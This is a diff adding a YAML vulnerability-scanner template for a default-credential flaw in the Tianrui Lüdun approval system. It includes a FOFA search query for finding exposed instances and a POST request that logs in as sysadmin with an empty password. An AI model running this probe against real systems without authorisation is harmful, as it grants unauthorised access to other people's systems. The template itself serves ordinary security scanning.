@@ -1,0 +1,30 @@
+id: tianrui-trwfe-default-creds
+
+info:
+  name: 天锐绿盾审批系统默认密码漏洞
+  author: onewin
+  severity: high
+  description: |
+    天锐绿盾审批系统存在默认凭证漏洞，使用sysadmin空密码可直接登录系统
+    [漏洞发现时间：2025年7月]
+  metadata:
+    fofa-query: 'body="/trwfe/" || title="天锐绿盾"'
+  tags: TIPPAY-绿盾审批系统
+
+http:
+  - method: POST
+    path:
+      - "{{BaseURL}}/trwfe/user/logon.do"
+    headers:
+      User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.2881.43 Safari/537.36
+      Content-Type: application/x-www-form-urlencoded
+    body: "lastName=sysadmin&password=&randomCode=&j_language=zh-CN"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 302  # 登录成功重定向
+      - type: word
+        words:
+          - "/trwfe/login.jsp"  # 成功登录跳转路径
+        part: header
